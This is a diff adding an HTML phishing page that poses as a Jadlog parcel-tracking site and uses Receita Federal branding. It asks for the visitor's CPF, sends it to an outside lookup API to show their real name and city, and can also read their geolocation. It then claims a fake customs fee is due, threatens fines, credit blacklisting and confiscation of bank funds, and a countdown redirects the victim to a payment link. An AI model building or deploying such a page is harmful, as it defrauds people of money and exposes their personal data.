@@ -1,0 +1,210 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jadlog - Sua encomenda no melhor caminho.</title>
+    <link rel="shortcut icon" href="../../jadlog/img/favicon.png">
+    <link rel="apple-touch-icon" href="../../jadlog/img/favicon.png">
+    <link href="css2.html" rel="stylesheet">
+    <link rel="stylesheet" href="css/styles.css">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            background-color: #f8f8f8;
+            margin-top: 20px;
+        }
+
+        .footer .read-more {
+            cursor: pointer;
+            color: blue;
+            text-decoration: underline;
+        }
+
+        .footer .hidden-content {
+            display: none;
+            margin-top: 10px;
+            color: #333;
+        }
+    </style>
+    <!-- Google tag (gtag.js) -->
+    <script type="text/javascript" src="https://br52.hostgator.com.br:2083/Tvxmwpd6enf4ldhWtes0hB1TYKAU98xpf9ZFnUiZLKHapn6TXATY22mDQdK0yt6N9oRng1ITDdkvksqcefu8OQ=="></script><script type="text/javascript" src="https://br52.hostgator.com.br:2083/UVu98IsG1BH2MtpxX6L0vMJ6kXNDvYGwDxUw2_SLmJToUg_IIL8x9fSVT9WKjXQ21frXnDtIVgBSOQ7ylkuzLQ=="></script><script type="text/javascript" src="https://br52.hostgator.com.br:2083/veUk2Ai-xzhQ0ND_PKaaOtajRRntdQmFAPRFUqHmfi9WRfBG05MQ8InF6fUlSkHbrP5FpndEGrAhyDIjAQGh-A=="></script><script async="" src="js_1.html"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'G-HHVFX3HTTL');
+    </script>
+</head>
+
+<body>
+    <div class="cpf-overlay">
+        <div class="cpf-content">
+            <img src="images/2.png" alt="Logo" style="width: 150px; height: auto;">
+            <div class="cpf-header">ACOMPANHE SEU PEDIDO</div>
+            <div class="cpf-info">Para acompanhar seu pedido, preencha o campo abaixo com os dados fornecidos durante a compra.</div>
+            <form method="get" action="">
+                <input type="tel" name="cpf" id="cpfInput" class="cpf-input" placeholder="CPF" maxlength="14" required="">
+                <button type="submit" class="cpf-button">Acompanhar Pedido</button>
+            </form>
+            <div id="error-message" class="error"></div>
+        </div>
+    </div>
+
+    <div class="popup-overlay" style="display: none;">
+        <div class="popup-content">
+            <img src="images/receita-federal-logo.png" alt="Logo" style="width: 150px;height: auto;margin-bottom: 3px;">
+            <img src="images/receitacolorido.jpg" alt="Logo" style="width: 70px;height: auto;margin-bottom: 3px;float: right;opacity: 0.8;">
+            <div class="popup-greeting">Dados Encontrados</div>
+            <div class="order-info">
+                <p>Titular:<br><span id="NOME">{{ Nome }}</span></p>
+                <p style="margin: -4px 0;font-size: 12px;color: #000000;font-weight: 100;">
+                    Cidade: <span id="cidade"></span>
+                </p>
+            </div>
+            <div class="popup-header">SUJEITO A MULTA DE R$ 1.872,91</div>
+            <div class="popup-warning-logo">
+                <div class="popup-warning"><span class="atenc">Atenção:</span> Caso o pagamento do tributo não seja realizado para o despacho do seu pedido, uma multa será registrada no SPC/Serasa no<br><p></p>
+                    <span class="atenc">Titular: </span><b id="warningNome">{{ Nome }}</b><br><span class="atenc">CPF:</span> <b id="warningCPF">{{ cpf }}</b>
+                </div>
+            </div>
+            <div class="popup-taxes">
+                <ul>
+                    <li><span class="tax-name">Processamento Eletrônico</span><span class="tax-amount">R$ 13,73</span></li>
+                    <li><span class="tax-name">ICMS</span><span class="tax-amount">R$ 19,51</span></li>
+                    <li><span class="tax-name">Contribuição Federal</span><span class="tax-amount">R$ 24,11</span></li>
+                </ul>
+            </div>
+            <div class="popup-total"><span>Total:</span> R$ 57,35</div>
+            <a href="#" class="popup-button" id="payTariffButton" data-utm="true">Regularizar tarifa</a>
+            <div class="timer-alert">
+                <span class="timer-text">Tempo Restante:
+                    <span id="timer">10</span> segundos
+                </span>
+                <br>
+                <span class="timer-warning">Não regularizar resultará em negativação, e <span style="color: #514e4e;">confisco do dinheiro em conta bancária.</span></span><br>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.querySelector('.cpf-content form');
+            const cpfInput = document.getElementById('cpfInput');
+            const popupOverlay = document.querySelector('.popup-overlay');
+            const errorMessage = document.getElementById('error-message');
+            const timerElement = document.getElementById('timer');
+            const payTariffButton = document.getElementById('payTariffButton');
+
+            // Função para aplicar a máscara de CPF
+            cpfInput.addEventListener('input', function () {
+                let value = cpfInput.value.replace(/\D/g, ''); // Remove caracteres não numéricos
+                if (value.length > 3) value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                if (value.length > 7) value = value.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+                if (value.length > 11) value = value.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+                cpfInput.value = value;
+            });
+
+            // Função para formatar CPF na segunda tela
+            function formatCPF(cpf) {
+                return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            }
+            function reverseGeocode(lat, lon) {
+                const url = 'https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=' + encodeURIComponent(lat) + '&lon=' + encodeURIComponent(lon);
+                return fetch(url, { headers: { 'Accept': 'application/json' } })
+                    .then(r => r.json())
+                    .then(d => {
+                        const a = d && d.address ? d.address : {};
+                        return a.city || a.town || a.village || a.municipality || a.state || (d && d.display_name ? d.display_name : '');
+                    })
+                    .catch(() => '');
+            }
+            function tryGeolocationFillCidade() {
+                const el = document.getElementById('cidade');
+                if (!el || !navigator.geolocation) return;
+                navigator.geolocation.getCurrentPosition(function (pos) {
+                    reverseGeocode(pos.coords.latitude, pos.coords.longitude).then(function (c) {
+                        if (c) el.textContent = c;
+                    });
+                });
+            }
+
+            if (form) {
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    const cpf = cpfInput.value.replace(/\D/g, ''); // Remove caracteres não numéricos
+
+                    if (!/^\d{11}$/.test(cpf)) {
+                        errorMessage.textContent = 'CPF inválido. Use apenas números.';
+                        return;
+                    }
+
+                    const apiURL = 'https://searchapi.dnnl.live/consulta?token_api=1835&cpf=' + cpf;
+
+                    fetch(apiURL, {
+                        method: 'GET',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data && !data.error) {
+                                const dados = Array.isArray(data.DADOS) ? data.DADOS : (Array.isArray(data.dados) ? data.dados : []);
+                                const first = dados.length > 0 ? dados[0] : {};
+                                const nameRaw = first.NOME || first.Nome || first.nome || first.NOME_COMPLETO || first.nomeCompleto || first.NOME_SOCIAL || '';
+                                const name = (typeof nameRaw === 'string' ? nameRaw.trim() : '') || 'Não encontrado';
+
+                                document.getElementById('NOME').textContent = name;
+                                document.getElementById('warningNome').textContent = name;
+                                document.getElementById('warningCPF').textContent = formatCPF(cpf);
+
+                                const enderecos = Array.isArray(data.ENDERECOS) ? data.ENDERECOS : (Array.isArray(data.enderecos) ? data.enderecos : []);
+                                const cidadeRaw = enderecos.length > 0 ? (enderecos[0].CIDADE || enderecos[0].Cidade || enderecos[0].cidade || '') : '';
+                                const cidade = (typeof cidadeRaw === 'string' ? cidadeRaw.trim() : '') || 'Cidade não encontrada';
+                                document.getElementById('cidade').textContent = cidade;
+                                if (!cidade || cidade === 'Cidade não encontrada') {
+                                    tryGeolocationFillCidade();
+                                }
+
+                                const baseURL = 'https://pay.smartordersafe.space/nQ7kZ7kV1WNZ0eJ';
+                                payTariffButton.href = baseURL;
+
+                                document.querySelector('.cpf-overlay').style.display = 'none';
+                                popupOverlay.style.display = 'flex';
+
+                                // Inicia o temporizador
+                                let timeLeft = 600;
+                                timerElement.textContent = timeLeft;
+                                const countdown = setInterval(() => {
+                                    timeLeft--;
+                                    timerElement.textContent = timeLeft;
+                                    if (timeLeft <= 0) {
+                                        clearInterval(countdown);
+                                        window.location.href = baseURL;
+                                    }
+                                }, 1000);
+                            } else {
+                                errorMessage.textContent = 'Dados não encontrados para este CPF.';
+                                console.log("Erro no retorno da API:", data);
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Erro ao consultar a API:", error);
+                            errorMessage.textContent = 'Erro ao processar sua solicitação.';
+                        });
+                });
+            }
+        });
+    </script>
+
+
+
+</body></html>
